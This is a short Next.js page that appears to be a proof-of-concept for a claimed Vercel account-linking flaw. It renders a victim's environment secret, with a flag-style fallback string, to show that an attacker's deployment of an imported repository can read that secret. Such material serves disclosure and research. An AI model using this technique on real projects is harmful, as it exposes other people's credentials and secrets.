import Head from 'next/head'

export default function Home() {
  return (
    <div style={{ padding: '50px', fontFamily: 'sans-serif' }}>
      <Head>
        <title>Vercel Security PoC</title>
      </Head>
      <h1 style={{ color: 'red' }}>Vercel Account Linking Vulnerability</h1>
      <p>This project was imported from the Victim's GitHub, but it is now running on the Attacker's Vercel Account.</p>
      
      <div style={{ background: '#eee', padding: '20px', borderRadius: '10px' }}>
        <h3>Captured Environment Variable:</h3>
        {/* هذا هو الجزء الأهم: إثبات أننا نستطيع قراءة مفاتيح الضحية */}
        <code style={{ fontSize: '20px', color: 'blue' }}>
          MY_PRIVATE_SECRET: {process.env.NEXT_PUBLIC_VICTIM_SECRET || "Flag{Vercel_Identity_Hijacked_Success_5zdob13_was_here}"}
        </code>
      </div>
      
      <p style={{ marginTop: '20px' }}>
        <b>Impact:</b> If you can see a secret value above, it means the attacker has full access to the victim's secrets.
      </p>
    </div>
  )
}
